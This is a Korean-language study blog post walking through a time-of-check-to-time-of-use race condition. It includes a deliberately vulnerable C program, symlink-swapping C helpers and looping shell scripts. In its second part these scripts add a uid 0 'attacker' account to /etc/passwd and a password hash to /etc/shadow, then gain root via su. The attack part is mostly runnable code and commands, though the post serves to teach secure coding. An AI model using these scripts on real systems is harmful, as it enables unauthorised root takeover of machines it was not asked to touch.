---
title: Toctou Exploit
date: 2023-10-01 01:22:14 +09:00
categories: [Study, Secure Coding]
tags: [toctou]     # TAG names should always be lowercase
math: true
mermaid: true # 표 생성
---

## 시나리오 PART A
> 1. Attacker가 Victim's system에 접속했다. 
2. Attacker는 Victim's system에 race condtion취약점이 있는 파일을 발견했다. 
3. Attacker는 취악점이 있는 파일을 이용하여 passwd파일을 변경하고자 한다. 
4. Attacker는 symbolic link.c 파일과 shellscript 파일을 작성하여 passwd파일 내용을 변경한다.
[※ Toctou Exploit](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)

### 취약점 파일 코드 분석

#### - _vulnerable-program.c_
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define DELAY 50000

int main(int argc, char *argv[]){
	char *fileName = argv[1];
	char buffer[1000];

	int i;
	FILE *fileHandler;

	scanf("%s", buffer);

	if(!access(fileName, W_OK)){
		int a;
		for(i=0;i<DELAY;i++){
			a=i^2;
		}
		fileHandler = fopen(fileName, "a+");

		fwrite("\n", sizeof(char), 1, fileHandler);
		fwrite(buffer, sizeof(char), strlen(buffer), fileHandler);
		fwrite("\n", sizeof(char), 1, fileHandler);
		fclose(fileHandler);
	}
	else{
	}
}

```
> FileName을 인자로 받고 해당 File이 Write권한이 있다면 if문으로 들어간다. 파일에 쓰기 작업을 수행하기 전, 잠시 대기하는 Delay시간이 있다. if문 내에서 fopen(), fwrite()함수를 사용하여 파일을 열고 쓰는데, 다른 프로세스가 파일을 열어 쓰는중이거나 파일에 쓰기 작업을 진행하는 경우 충돌이 발생한다. 즉, race condtion 취약점이 존재한다. 또한 파일에 대한 링크를 확인하거나 감시하는 코드가 없음

**✨if문 내에서 지연이 발생하는 동안 다른 파일로 redirect하여 다른 파일에 접근하는 방법을 사용하여 공격이 가능하다**

---

### 공격자가 작성한 코드 분석

#### _symbolic-link.c_
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]){
	unlink(argv[1]);
	symlink("./passwd", argv[1]);
	return 0;
}
```
> passwd파일을 symbolic link의 destination로 설정한다.
- [soft link VS hard link](https://ndb796.tistory.com/506)
- [How to use symlink()](https://badayak.com/entry/C%EC%96%B8%EC%96%B4-%EC%8B%AC%EB%B3%BC%EB%A6%AD-%EB%A7%81%ED%81%AC%EB%A5%BC-%EC%83%9D%EC%84%B1-%ED%95%A8%EC%88%98-symlink)

#### _exploit.sh_
```shell
old=`ls -l passwd`; new=`ls -l passwd`

while [ "$old" = "$new" ]
do
	rm -rf temp
	echo "This is a file that the user can overwrite" > temp
	echo "TOCTOU-Attack-Success" | ./vulnerable-program temp & ./symbolic-link temp & new=`ls -l passwd`

done

rm -rf temp;

echo "STOP... The passwd file has been changed"
```
> Attacker가 작성한 심볼릭 링크를 이용한 TOCTOU공격 수행 shellscript이다.
passwd파일의 상태를 확인하고 상태가 변경되면 while문을 종료하는 스크립트이다. vulnerable-program과 symbolic-link를 계속해서 변경하며 수행한다. vulnerable-program에 temp파일을 입력값으로 전달하고 동시에, symbolic-link 프로그램이 temp파일을 이용하여 백그라운드에서 실행된다. 이때, passwd파일의 상태를 확인하여 변경 여부를 파악한다.
```shell
echo "TOCTOU-Attack-Success" | ./vulnerable-program temp & ./symbolic-link temp & new=`ls -l passwd`
```
표준 출력은 버퍼를 사용하지 않고 파이프를 통해 취약한 프로그램에 입력값으로 제공된다. temp파일의 권한을 확인하고 쓰기 작업이 시작되면 입력값이 입력된다. '&' 는 이전 명령과 상관없이 백그라운드에서 symbolic link를 수행하게 해준다. 

---
### 공격 실행
1. exploit.sh실행 전, passwd파일 내용 확인<br>
 ```cat passwd```
![cat passwd](/assets/img/_POST/Tocout Exploit/image10.png)

2.  shellscript실행<br>
 ```sh exploit.sh```
![sh exploit.sh](/assets/img/_POST/Tocout Exploit/image11.png)

3. passwd파일 내용 재확인<br>
 ```cat passwd```
![cat passwd](/assets/img/_POST/Tocout Exploit/image12.png)



---

## 시나리오 PART B
>  1. Attacker는 Victim's system에 guest계정으로 ssh접속을 한다.<br>
	❗guest계정은 관리자 권한이 없으며 비밀번호가 없다.
2. Attacker는 Victim's system에 race condtion취약점이 있는 파일을 발견했다. 
3. Attacker는 취악점이 있는 파일을 이용하여 /etc/passwd파일과 /etc/shadow파일을 변경하여 'attacker'사용자를 추가하여 root계정을 얻고자 한다. 
4. Attacker는 symbolic link 파일과 shellscript 파일을 작성하여 /etc/passwd파일과 /etc/shadow파일에 'attacker'계정을 추가한다.
5. Attacker는 추가된 'attacker'계정을 통해 root권한을 획득한다.

---

### 기본 지식
- 리눅스에서의 사용자 비밀번호 저장<br>
1) **/etc/passwd** : 사용자의 계정 정보를 저장하는 파일이다. 과거에는 해당 파일에 사용자의 패스워드를 저장하였지만 보안을 위해 현재는 /etc/shadow 파일에 암호화된 패스워드를 저장한다.
`[user_account]:[user_password]:[user_ID]:[group_ID]:[comment]:[hone_directory]:[login_shell]`<br>
❗user_password 필드에는 x로 표시되있는데, 이는 패스워드를 사용하지 않는다는 것이 아닌 shadow 패스워드 방식을 사용한다는 의미이다. <br>
2) **/etc/shadow** : 사용자의 암호화된 패스워드와 패스워드 암호화 방법에 대한 정보가 저장되어 있다.<br>
`[user_account]:[encrypted_password]:[last_change]:[minlife]:[maxlife]:[warn]:[inactive]:[expires]`<br>
두번째 필드는 암호화된 패스워드가 저장되며 `$algorithm_id$salt$encrypted_password` 구조로 되어있다.
**`algorithm_id`**는 패스워드를 어떤 hash알고리즘을 사용하여 암호화하였는지에 대한 정보가 담겨있다. **`salt`**는 패스워드를 암호화할 때 추가되는 랜덤값이다. **`encrypted_password`**는 hash 알고리즘과 salt로 패스워드를 암호화한 결과 값(다이제스트 값)이다.<br>
[/etc/passwd 구조, /etc/shadow 구조](https://reakwon.tistory.com/137)


- 리눅스에서의 사용자 식별 및 인증<br>
1) **/etc/passwd**에서 입력받은 id가 있는지 확인하여 있을 경우, 비밀번호 필드에 x가 있는지 확인한다.<br>
2) x가 있다면 **/etc/shadow** 파일에 사용자에게 입력받았던 id를 인덱스로 하여 접근한다. 사용자 바밀번호 해시 알고리즘과 솔트값을 알아낸 후 그에 맞추어 입력받은 pw를 해시하여 다이제스트값을 원본 다이제스트값과 비교하여 일치한다면 인증을 완료한다.


- 관리자는 uid와 gid가 모두 0이다.<br>
    [UID, GID](https://jstar0525.tistory.com/9)

---

### 취약점 파일 코드 분석
    Part A의 취약점 파일과 동일한 파일을 사용한다.
---

### 공격자가 작성한 코드 분석
#### _symbolic-link-B.c_
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]){
	unlink(argv[1]);
	symlink("/etc/shadow", argv[1]);
	return 0;
}
```
> /etc/shadow파일을 symbolic link의 destination로 설정한다.

#### _symbolic-link-B-passwd.c_
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]){
	unlink(argv[1]);
	symlink("/etc/passwd", argv[1]);
	return 0;
}
```
> /etc/passwd파일을 symbolic link의 destination로 설정한다.

#### _exploit-B.sh_
```shell
old=`ls -l /etc/shadow`; new=`ls -l /etc/shadow`

while [ "$old" = "$new" ]
do
	rm -rf temp
	echo "This is a file that the user can overwrite" > temp
	printf "attacker:\$y\$j9T\$bkTnLvgAOz2Pl.PDD/p/m1\$w3EKQOi/wck44c1qntPgPKkfAxLblG1QdEK2YCtMmd0:19691:0:99999:7:::" | ./vunlerable-program temp & ./symbolic-link-B temp & new=`ls -l /etc/shadow`

done

rm -rf temp;

echo "STOP... The passwd file has been changed"
```
> PART A에서 사용했던 exploit.sh 코드와 유사하다.
attacker 사용자의 정보를 추가해야 하는데, 추가해야 하는 정보에 escape 문자가 포함되어 있기 때문에  **echo**가 아닌 **printf**를 사용한다. 

#### _exploit-B-passwd.sh_
```shell
old=`ls -l /etc/passwd`; new=`ls -l /etc/passwd`

while [ "$old" = "$new" ]
do
	rm -rf temp
	echo "This is a file that the user can overwrite" > temp
	echo "attacker:x:0:0:attacker,,,:/home/attacker:/bin/bash" | ./vulnerable-program temp & ./symbolic-link-B-passwd temp & new=`ls -l /etc/passwd`

done

rm -rf temp;

echo "STOP... The passwd file has been changed"
```
>PART A에서 사용했던 코드와 유사하다. 
관리자는 uid와 gid가 모두 0이기 때문에 attacker는 관리자 권한을 얻기 위해 uid와 gid를 모두 0으로 설정한다.


---

### 공격 실행
1. Attacker system에서 Victim system에 guest계정으로 ssh접속을 한다.
![](/assets/img/_POST/Tocout Exploit/image1.png)

2. Attacker는 Victim system에서 공격에 필요한 모든 파일을 생성한다.

3. Victim system에서 /etc/passwd 파일에 attacker 사용자가 있는지 확인한다.<br>
	`sudo cat /etc/passwd | grep attacker`
    ![](/assets/img/_POST/Tocout Exploit/image2.png)

4. Attacker System에서 exploit-B-passwd.sh파일을 실행한다.<br>
	`sh exploit-B-passwd.sh`
    ![](/assets/img/_POST/Tocout Exploit/image3.png)

5. 다시 Victim system에서 /etc/passwd 파일에 attacker 사용자가 있는지 확인한다.<br>
	`sudo cat /etc/passwd | grep attacker`
    ![](/assets/img/_POST/Tocout Exploit/image4.png)

6. Victim system에서 /etc/shadow 파일에 attacker 사용자가 있는지 확인한다.<br>
	`sudo cat /etc/shadow | grep attacker`
    ![](/assets/img/_POST/Tocout Exploit/image5.png)

7. Attacker System에서 exploit-B.sh파일을 실행한다.<br>
	`sh exploit-B.sh`
    ![](/assets/img/_POST/Tocout Exploit/image6.png)

8. 다시 Victim system에서 /etc/shadow 파일에 attacker 사용자가 있는지 확인한다.<br>
	`sudo cat /etc/shadow | grep attacker`
    ![](/assets/img/_POST/Tocout Exploit/image7.png)

9. Attacker System에서 attacker 계정으로 root권한을 얻는다.<br>
	`su attacker`
    ![](/assets/img/_POST/Tocout Exploit/image8.png)

 
---

### 파일 목록 및 권한
![](/assets/img/_POST/Tocout Exploit/image9.png)
